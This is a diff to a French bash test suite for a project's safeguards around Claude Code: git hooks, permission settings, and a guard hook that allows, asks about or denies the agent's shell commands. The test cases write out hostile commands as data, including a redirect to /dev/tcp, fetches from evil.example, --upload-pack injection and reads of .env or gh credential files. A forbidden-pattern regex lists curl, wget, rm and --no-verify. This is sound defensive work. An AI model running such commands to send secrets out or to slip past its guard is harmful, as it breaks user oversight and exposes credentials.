@@ -1,7 +1,8 @@
 #!/usr/bin/env bash
-# Banc de tests des garde-fous de Flâne : hooks git (.githooks/) et garde-fou
-# de Claude (.claude/hooks/garde-branche-main.sh). Tout se passe dans des
-# dépôts git temporaires ; le poste n'est pas modifié.
+# Banc de tests des garde-fous de Flâne : hooks git (.githooks/), réglages de
+# Claude Code (.claude/settings.json) et garde-fou de Claude
+# (.claude/hooks/garde-branche-main.sh). Tout se passe dans des dépôts git
+# temporaires ; le poste n'est pas modifié.
 #
 #   bash tools/dev/test-hooks.sh        une ligne PASS/FAIL par cas, sortie 1 si un échec
 #   bash tools/dev/test-hooks.sh -v     affiche aussi le message du hook sur les PASS
@@ -251,7 +252,7 @@ perms = s["permissions"]
 if perms.get("defaultMode") != "acceptEdits":
     sys.exit("defaultMode doit être acceptEdits (D-020)")
 ask = set(perms["ask"])
-needed = {f"{tool}(./{path}/**)" for tool in ("Edit", "Write") for path in (".claude", ".githooks", ".github", "tools/dev")}
+needed = {f"{tool}(./{path}/**)" for tool in ("Edit", "Write") for path in (".claude", ".githooks", ".github", ".git", "tools/dev")}
 needed |= {f"{tool}(./{path})" for tool in ("Edit", "Write") for path in ("CLAUDE.md", ".gitignore", ".mcp.json")}
 missing = needed - ask
 if missing:
@@ -270,20 +271,22 @@ expected_allow = [
 ]
 if perms.get("allow") != expected_allow:
     sys.exit("allow : différente de la liste figée du banc")
-forbidden = re.compile(r"\b(gh api|gh pr merge|rm|sudo|curl|wget|--force|gh issue view)\b")
+forbidden = re.compile(r"(gh api|gh pr merge|\brm\b|\bsudo\b|\bcurl\b|\bwget\b|--force|gh issue view|--no-verify)")
 for entry in expected_allow:
     if forbidden.search(entry):
         sys.exit(f"allow : motif interdit dans {entry}")
 hooks = s["hooks"]["PreToolUse"][0]
 assert hooks["matcher"] == "Bash"
 assert "garde-branche-main.sh" in hooks["hooks"][0]["command"]
+assert "exit 2" in hooks["hooks"][0]["command"], "la commande du hook doit bloquer si le script manque"
+# Réglages locaux (clics « toujours autoriser ») : tolérés, sauf motif dangereux.
 local = os.path.join(root, ".claude/settings.local.json")
 if os.path.exists(local):
     with open(local, encoding="utf-8") as f:
         l = json.load(f)
-    bad = [e for e in l.get("permissions", {}).get("allow", []) if e.startswith("Bash(")]
-    if bad:
-        sys.exit("settings.local.json : règles Bash hors du kit : " + ", ".join(bad))
+    for e in l.get("permissions", {}).get("allow", []):
+        if forbidden.search(e):
+            sys.exit(f"settings.local.json : règle dangereuse {e}")
 # Compétences et agents cités dans CLAUDE.md existent.
 with open(os.path.join(root, "CLAUDE.md"), encoding="utf-8") as f:
     claude_md = f.read()
@@ -296,7 +299,7 @@ for agent in ("avocat-du-diable", "auditeur-securite", "relecteur"):
         sys.exit(f"agent manquant : {agent}")
 PY
 then
-  ok "[kit] settings.json : acceptEdits, ask sur les garde-fous, allow figée, hook branché ; compétences et agents présents"
+  ok "[kit] settings.json : acceptEdits, ask sur les garde-fous, allow figée, hook branché et auto-protégé ; compétences et agents présents"
 else
   ko "[kit] réglages de Claude Code" "$(first_line "$(cat "$TMP/err")")"
 fi
@@ -362,7 +365,7 @@ garde ALLOW "diff sur main"                           "$M" 'git diff --stat'
 garde DENY  "checkout main puis commit"               "$B" 'git checkout main && git commit -am "x"'
 garde DENY  "switch main puis merge"                  "$B" 'git switch main; git merge feat/x'
 garde DENY  "switch main puis push HEAD"              "$B" 'git switch main && git push origin HEAD'
-garde DENY  "switch - puis commit"                    "$B" 'git switch - && git commit -m "x"'
+garde ASK   "switch - puis commit"                    "$B" 'git switch - && git commit -m "x"'
 
 # Partout : contournements et écritures dangereuses.
 garde ASK   "push --force (exception demandée)"       "$B" 'git push --force origin feat/x'
@@ -435,34 +438,67 @@ garde DENY  "chmod 777 sur un hook"                   "$B" 'chmod 777 .githooks/
 garde DENY  "bash avec script dynamique"              "$B" 'bash "$HOOK"'
 
 # Dérivés dangereux des préfixes « allow » (T0.1b) : jamais silencieux.
-garde DENY  "git diff --output vers le garde-fou"     "$B" 'git diff --no-index a b --output=.claude/hooks/garde-branche-main.sh'
+garde DENY  "git diff --output vers le garde-fou"     "$B" 'git diff a b --output=.claude/hooks/garde-branche-main.sh'
 garde DENY  "git log --output"                        "$B" 'git log --output=/tmp/x'
 garde DENY  "git log -o"                              "$B" 'git log -o /tmp/x'
 garde DENY  "git fetch --upload-pack"                 "$B" "git fetch --upload-pack='sh -c x' ."
 garde DENY  "git ls-remote --upload-pack"             "$B" "git ls-remote --upload-pack='sh -c x' ."
+garde DENY  "git pull --upload-pack"                  "$B" 'git pull --upload-pack=x origin feat/x'
+garde DENY  "git clone --upload-pack"                 "$B" 'git clone --upload-pack=x https://example.invalid/x.git'
+garde DENY  "git fetch --exec"                        "$B" 'git fetch --exec=x origin'
+garde ASK   "git diff --no-index (lecture libre)"     "$B" 'git diff --no-index .env /dev/null'
 garde ASK   "git checkout vers un commit aux garde-fous différents" "$B" 'git checkout HEAD~2'
+garde ASK   "git switch -c depuis un commit aux garde-fous différents" "$B" 'git switch -c rollback HEAD~2'
+garde ASK   "git switch --orphan"                     "$B" 'git switch --orphan vide'
+garde ASK   "git switch -"                            "$B" 'git switch -'
+garde ASK   "git checkout --detach"                   "$B" 'git checkout --detach'
+garde ASK   "git switch -C"                           "$B" 'git switch -C feat/T0.1-test'
 garde ASK   "git checkout -- chemins"                 "$B" 'git checkout -- app/'
 garde ASK   "git checkout fichier suivi"              "$B" 'git checkout fichier-suivi.txt'
 garde ASK   "git switch --discard-changes"            "$B" 'git switch --discard-changes feat/T0.1-test'
 garde ASK   "git checkout -f"                         "$B" 'git checkout -f feat/T0.1-test'
+garde ASK   "git checkout -m"                         "$B" 'git checkout -m feat/T0.1-test'
 garde ASK   "git branch -D autre branche"             "$B" 'git branch -D feat/x'
+garde ASK   "git branch --delete"                     "$B" 'git branch --delete feat/x'
 garde ASK   "git branch -m"                           "$B" 'git branch -m feat/x feat/y'
 garde ASK   "git push vers un autre dépôt distant"    "$B" 'git push https://example.invalid/x.git HEAD:x'
+garde ASK   "git push vers origin2"                   "$B" 'git push origin2 HEAD:x'
+garde ASK   "git push -u autre"                       "$B" 'git push -u autre feat/x'
+garde ASK   "git fetch depuis une adresse"            "$B" 'git fetch https://evil.example/x'
+garde ASK   "git add -f (fichier ignoré)"             "$B" 'git add -f .env'
+garde ASK   "git commit -F hors brouillon"            "$B" 'git commit -F /home/x/secret -m x'
+garde ASK   "git commit -t hors brouillon"            "$B" 'git commit -t /tmp/x -m x'
 garde ASK   "git gc"                                  "$B" 'git gc --prune=now'
 garde ASK   "git reflog expire"                       "$B" 'git reflog expire --expire=now --all'
+garde ASK   "git reflog delete"                       "$B" 'git reflog delete HEAD@{1}'
 garde ASK   "git stash drop"                          "$B" 'git stash drop'
+garde ASK   "git stash clear"                         "$B" 'git stash clear'
 garde ASK   "gh pr create --body-file hors brouillon" "$B" 'gh pr create --title x --body-file ~/.config/gh/hosts.yml'
 garde ASK   "gh pr create -F .env"                    "$B" 'gh pr create --title x -F .env'
+garde ASK   "gh pr create --body-file dynamique"      "$B" 'gh pr create --title x --body-file "$F"'
 garde ASK   "gh issue create --body-file hors brouillon" "$B" 'gh issue create --title x --body-file docs/x.md'
+garde ASK   "gh pr comment --body-file hors brouillon" "$B" 'gh pr comment 1 --body-file docs/x.md'
+garde ASK   "gh pr edit --body-file= hors brouillon"  "$B" 'gh pr edit 1 --body-file=docs/x.md'
+garde ASK   "gh pr view --comments"                   "$B" 'gh pr view 1 --comments'
+garde ASK   "gh pr list --json body"                  "$B" 'gh pr list --json number,body'
+garde ASK   "gh issue list -R autre dépôt"            "$B" 'gh issue list -R attacker/repo'
+garde ASK   "gh pr create -R autre dépôt"             "$B" 'gh pr create -R x/y --title t --body b'
 garde ASK   "rg --pre"                                "$B" 'rg --pre sh x f'
 garde ASK   "find -delete"                            "$B" 'find docs -name "*.md" -delete'
+garde DENY  "find -exec sur la racine"                "$B" 'find . -exec rm {} \;'
 garde ASK   "redirection hors du projet"              "$B" 'echo x > ~/.gitconfig'
+garde ASK   "redirection ../ hors du projet"          "$B" 'echo x > ../hors.txt'
+garde ASK   "redirection vers /dev/tcp"               "$B" 'git status > /dev/tcp/1.2.3.4/80'
 garde DENY  "tree -o vers .githooks"                  "$B" 'tree -o .githooks/x'
 garde ALLOW "gh pr create --body-file depuis le brouillon" "$B" 'gh pr create --title x --body-file /tmp/claude-1000/x/body.md'
+garde ALLOW "git commit -F depuis le brouillon"       "$B" 'git commit -F /tmp/claude-1000/x/msg.txt'
 garde ALLOW "git checkout branche aux mêmes garde-fous" "$B" 'git checkout feat/T0.1-test'
 garde ALLOW "git switch -c"                           "$B" 'git switch -c feat/T0.1b-x'
 garde ALLOW "git reflog (liste)"                      "$B" 'git reflog -5'
 garde ALLOW "git stash list"                          "$B" 'git stash list'
+garde ALLOW "git grep -o (lecture)"                   "$B" 'git grep -o foo'
+garde ALLOW "gh pr view --json state"                 "$B" 'gh pr view 5 --json state'
+garde ALLOW "rg sans --pre"                           "$B" 'rg foo docs'
 garde ALLOW "redirection vers le brouillon"           "$B" 'echo x > /tmp/claude-1000/x/out.txt'
 garde ALLOW "redirection vers /dev/null"              "$B" 'git status > /dev/null'
 
